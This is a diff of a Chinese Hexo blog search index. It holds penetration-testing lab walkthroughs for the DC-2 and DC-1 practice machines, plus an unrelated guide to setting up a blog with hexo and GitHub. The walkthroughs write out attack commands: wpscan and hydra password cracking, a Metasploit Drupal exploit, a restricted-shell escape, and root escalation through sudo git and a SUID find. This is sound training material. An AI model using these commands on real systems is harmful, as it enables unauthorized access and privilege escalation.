+<h3 id="4、利用cewl生成的密码爆破"><a href="#4、利用cewl生成的密码爆破" class="headerlink" title="4、利用cewl生成的密码爆破"></a>4、利用cewl生成的密码爆破</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan –-url dc-2/ -P dict.txt #使用字典dict.txt破解所有用户密码</span><br><span class="line"></span><br><span class="line">[i] Valid Combinations Found:</span><br><span class="line"> Username: jerry, Password: adipiscing</span><br><span class="line"> Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-2/1574129738314.png" alt="1574129738314"></p>
+<h3 id="5、找到登录页面进行登录"><a href="#5、找到登录页面进行登录" class="headerlink" title="5、找到登录页面进行登录"></a>5、找到登录页面进行登录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">访问 http://dc-2/wp-admin #出现登录界面</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-2/1574129966981.png" alt="1574129966981"></p>
+<ul>
+<li>登陆后搜索flag，发现<strong>flag2</strong></li>
+</ul>
+<p><img src="/images/DC-2/1574131707472.png" alt="1574131707472"></p>
+<h3 id="6、利用tom用户名密码ssh登录"><a href="#6、利用tom用户名密码ssh登录" class="headerlink" title="6、利用tom用户名密码ssh登录"></a>6、利用tom用户名密码ssh登录</h3><p><img src="/images/DC-2/1574131922571.png" alt="1574131922571"></p>
+<ul>
+<li>cat 命令不能使用</li>
+<li>测试发现可以使用vi，查看<strong>flag3</strong></li>
+<li>提示使用su命令，测试发现shell受限</li>
+</ul>
+<p><img src="/images/DC-2/1574131992783.png" alt="1574131992783"></p>
+<p><img src="/images/DC-2/1574132138637.png" alt="1574132138637"></p>
+<h3 id="7、修改环境变量-切换shell"><a href="#7、修改环境变量-切换shell" class="headerlink" title="7、修改环境变量 切换shell"></a>7、修改环境变量 切换shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a </span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-2/1574133373299.png" alt="1574133373299"></p>
+<p><strong>参考</strong></p>
+<p> <a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a> </p>
+<h3 id="8、切换到jerry用户，找到flag4"><a href="#8、切换到jerry用户，找到flag4" class="headerlink" title="8、切换到jerry用户，找到flag4"></a>8、切换到jerry用户，找到flag4</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su jerry</span><br><span class="line">cd /home/jerry</span><br><span class="line">cat flag4.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-2/1574133698223.png" alt="1574133698223"></p>
+<h3 id="9、查看能够使用的root权限命令"><a href="#9、查看能够使用的root权限命令" class="headerlink" title="9、查看能够使用的root权限命令"></a>9、查看能够使用的root权限命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l # 发现git</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-2/1574134348644.png" alt="1574134348644"></p>
+<h3 id="10、git提权"><a href="#10、git提权" class="headerlink" title="10、git提权"></a>10、git提权</h3><p>git有一个缓冲区溢出漏洞，在使用sudo git -p –help时，不需要输入root密码即可以root权限执行这条命令。我们尽量减小缓冲区的行数，使其一次性显示不完这条命令的回显结果，这样这条命令就一直处于运行状态，加上此时处于root权限，我们直接在这时候打开bash shell，直接提权至root。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo git -p --help</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-2/1574133785339.png" alt="1574133785339"></p>
+<p><img src="/images/DC-2/1574133800149.png" alt="1574133800149"></p>
+<p><strong>参考</strong></p>
+<p> <a href="https://gtfobins.github.io/gtfobins/git/#limited-suid" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/git/#limited-suid</a> </p>
+]]></content>
+      <tags>
+        <tag>靶机渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-1</title>
+    <url>/2019/11/20/DC-1/</url>
+    <content><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="打靶流程"><a href="#打靶流程" class="headerlink" title="打靶流程"></a>打靶流程</h3><h5 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h5><p><img src="/images/DC-1/1571743256900.png" alt="1571743256900"></p>
+<p>发现80端口开放</p>
+<h5 id="2、访问"><a href="#2、访问" class="headerlink" title="2、访问"></a>2、访问</h5><p><img src="/images/DC-1/1571743296064.png" alt="1571743296064"></p>
+<p>发现为Drupal CMS</p>
+<h5 id="3、御剑扫描目录"><a href="#3、御剑扫描目录" class="headerlink" title="3、御剑扫描目录"></a>3、御剑扫描目录</h5><p><img src="/images/DC-1/1571743349794.png" alt="1571743349794"></p>
+<h5 id="4、-MSF-搜索是否有可用的Exp"><a href="#4、-MSF-搜索是否有可用的Exp" class="headerlink" title="4、###MSF 搜索是否有可用的Exp"></a>4、###MSF 搜索是否有可用的Exp</h5><p><img src="/images/DC-1/1571744035120.png" alt="1571744035120"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">set rhost &lt;remote ip&gt;</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="设置rhost"><a href="#设置rhost" class="headerlink" title="设置rhost"></a>设置rhost</h6><p><img src="/images/DC-1/1571744086888.png" alt="1571744086888"></p>
+<h6 id="run-getshell"><a href="#run-getshell" class="headerlink" title="run getshell"></a>run getshell</h6><p><img src="/images/DC-1/1571744114319.png" alt="1571744114319"></p>
+<h5 id="查看文件——获得第一个flag"><a href="#查看文件——获得第一个flag" class="headerlink" title="查看文件——获得第一个flag"></a>查看文件——获得第一个flag</h5><p><img src="/images/DC-1/1571744256003.png" alt="1571744256003"></p>
+<h5 id="提示配置文件"><a href="#提示配置文件" class="headerlink" title="提示配置文件"></a>提示配置文件</h5><p><img src="/images/DC-1/1571744283570.png" alt="1571744283570"></p>
+<h5 id="找到配置文件"><a href="#找到配置文件" class="headerlink" title="找到配置文件"></a>找到配置文件</h5><p><img src="/images/DC-1/1571748462121.png" alt="1571748462121"></p>
+<p><img src="/images/DC-1/1571748484756.png" alt="1571748484756"></p>
+<h4 id="利用python得到标准shell"><a href="#利用python得到标准shell" class="headerlink" title="利用python得到标准shell"></a>利用python得到标准shell</h4><p><img src="/images/DC-1/1571748547634.png" alt="1571748547634"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c "import pty;pty.spawn('/bin/bash')"</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="登录mysql"><a href="#登录mysql" class="headerlink" title="登录mysql"></a>登录mysql</h5><p><img src="/images/DC-1/1571748710717.png" alt="1571748710717"></p>
+<p><img src="/images/DC-1/1571748781907.png" alt="1571748781907"></p>
+<p><img src="/images/DC-1/1571748802886.png" alt="1571748802886"></p>
+<p><img src="/images/DC-1/1571748838261.png" alt="1571748838261"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改密码 将密码重置为password</span></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> pass=<span class="string">'$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4'</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'admin'</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p><img src="/images/DC-1/1571795230256.png" alt="1571795230256"></p>
+<p><img src="/images/DC-1/1571795256714.png" alt="1571795256714"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -P /Users/john-1.8.0/run/password.lst -vV 192.168.1.133 ssh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-1/1571795423693.png" alt="1571795423693"></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img src="/images/DC-1/1571795098147.png" alt="1571795098147"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br><span class="line">touch getflag</span><br><span class="line">find / -type f -name getflag -exec "whoami" \;</span><br><span class="line">find / -type f -name getflag -exec "/bin/sh" \;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>靶机渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo+Typora+git写博客</title>
+    <url>/2019/11/20/hexo-Typora-git%E5%86%99%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<h2 id="安装必要的软件"><a href="#安装必要的软件" class="headerlink" title="安装必要的软件"></a>安装必要的软件</h2><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><h3 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h3><h3 id="安装Typora"><a href="#安装Typora" class="headerlink" title="安装Typora"></a>安装Typora</h3><h2 id="创建本地hexo项目"><a href="#创建本地hexo项目" class="headerlink" title="创建本地hexo项目"></a>创建本地hexo项目</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>1、直接创建项目</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">hexo init blog <span class="comment"># blog为放置博客的文件夹</span></span><br><span class="line">cd blog</span><br></pre></td></tr></table></figure>
+
+<p> 2、创建文件夹，进入文件夹所在目录，执行init</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cd blog</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure>
+
+<p>以上语句执行完毕后， 你会在blog文件夹里看到如下: </p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">├── _config.yml <span class="comment">//网站的配置信息，您可以在此配置大部分的参数。 </span></span><br><span class="line">├── <span class="keyword">package</span>.json </span><br><span class="line">├── scaffolds <span class="comment">//模版文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。 </span></span><br><span class="line">├── source <span class="comment">//资源文件夹是存放用户资源的地方。</span></span><br><span class="line"> | ├── _drafts</span><br><span class="line"> | └── _posts </span><br><span class="line">└── themes <span class="comment">//主题文件夹。Hexo会根据主题来生成静态页面</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="创建文章"><a href="#创建文章" class="headerlink" title="创建文章"></a>创建文章</h3><p> 1、新建一篇文章（我的第一篇文章） </p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">hexo new helloworld</span><br></pre></td></tr></table></figure>
+
+<p> 会在/source/_post里自动生成了“helloworld.md”文件，之后新建的文章都将存放在此目录下。编辑“helloworld.md”文件可修改内容。 </p>
+<p>2、生成网站</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">hexo generate <span class="comment">#可简写成 hexo g</span></span><br></pre></td></tr></table></figure>
+
+<p>3、启动本地服务器（可不执行hexo g，直接执行hexo s，会自动生成网站）</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">hexo server <span class="comment">#可简写成 hexo s</span></span><br></pre></td></tr></table></figure>
+
+<p>4、在浏览器输入  <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000</a> 即可查看网站</p>
+<p><code>https://github.com/t0ng2333/t0ng2333.github.io</code></p>
+<h2 id="部署文章至github"><a href="#部署文章至github" class="headerlink" title="部署文章至github"></a>部署文章至github</h2><h3 id="在github上创建个人仓库"><a href="#在github上创建个人仓库" class="headerlink" title="在github上创建个人仓库"></a>在github上创建个人仓库</h3><p> 在项目根目录下找到 <code>_congif.yml</code>，找到 <code>deploy</code> 字段并填写完整 </p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">'git'</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:t0ng2333/t0ng2333.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
+
+<p>安装推送工具</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
+
+<p>执行推送命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>生产力工具</tag>
+      </tags>
+  </entry>
+</search>
